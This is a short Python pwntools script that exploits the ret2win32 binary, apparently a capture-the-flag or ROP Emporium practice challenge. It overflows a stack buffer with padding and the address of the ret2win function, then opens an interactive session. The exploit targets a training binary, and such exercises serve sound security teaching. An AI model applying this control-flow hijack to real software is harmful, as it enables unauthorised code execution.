from pwn import *

sh = process('./ret2win32')
elf = ELF('./ret2win32')

shell_addr = elf.symbols['ret2win']

payload = 'a' * (0x28 + 0x4) + p32(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()